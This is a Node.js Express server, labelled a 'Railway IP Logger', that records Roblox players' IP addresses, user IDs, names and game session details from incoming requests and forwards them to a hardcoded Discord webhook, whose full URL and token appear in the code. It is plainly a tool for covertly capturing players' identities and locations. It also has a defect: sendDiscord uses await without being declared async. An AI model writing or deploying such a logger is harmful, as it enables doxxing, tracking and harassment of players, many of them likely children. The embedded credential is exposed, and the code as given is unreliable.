const express = require('express');
const app = express();

// YOUR WEBHOOK - VERIFIED WORKING
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';

function sendDiscord(data) {
    const payload = {
        embeds: [{
            title: '🕵️ Roblox Player Captured',
            description: `\`UserID: ${data.userId}\``,
            color: 16711680,
            fields: [
                { name: '👤 Player', value: data.playerName || 'Unknown', inline: true },
                { name: '🌐 IP', value: `\`${data.ipAddress}\``, inline: true },
                { name: '📍 PlaceID', value: data.placeId || 'Unknown', inline: true },
                { name: '🆔 JobID', value: (data.jobId || '').slice(-8), inline: true },
                { name: '💻 OS', value: data.osPlatform || 'Unknown', inline: true }
            ],
            timestamp: new Date().toISOString(),
            footer: { text: 'Railway IP Logger' }
        }]
    };
    
    // RETRY 3x with delays
    for (let i = 0; i < 3; i++) {
        try {
            const response = await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log('✅ Discord SENT');
                return;
            }
        } catch (error) {
            console.log(`⚠️ Discord attempt ${i+1} failed:`, error.message);
            await new Promise(r => setTimeout(r, 1000 * (i + 1)));
        }
    }
    console.log('❌ Discord FAILED after 3 retries');
}

app.get('/log', async (req, res) => {
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                     req.headers['x-real-ip'] || 
                     req.ip || 'Unknown (Railway)';
    
    const playerData = {
        userId: req.query.userId || 'Unknown',
        playerName: req.query.playerName || 'Unknown',
        displayName: req.query.displayName || 'Unknown',
        placeId: req.query.placeId || 'Unknown',
        jobId: req.query.jobId || 'Unknown',
        osPlatform: req.query.osPlatform || 'Unknown',
        ipAddress: clientIP
    };
    
    console.log('🎮 NEW PLAYER:', playerData.playerName, '| IP:', clientIP);
    
    // SEND TO DISCORD IMMEDIATELY
    await sendDiscord(playerData);
    
    res.json({ 
        status: 'success', 
        message: 'Logged to Discord', 
        ip: clientIP,
        player: playerData.playerName 
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'active', webhook: DISCORD_WEBHOOK.slice(0, 50) + '...' });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🚀 Logger on port ${port}`);
    console.log(`📡 Test: /health`);
    console.log(`🔗 Webhook: ${DISCORD_WEBHOOK.slice(0, 50)}...`);
});
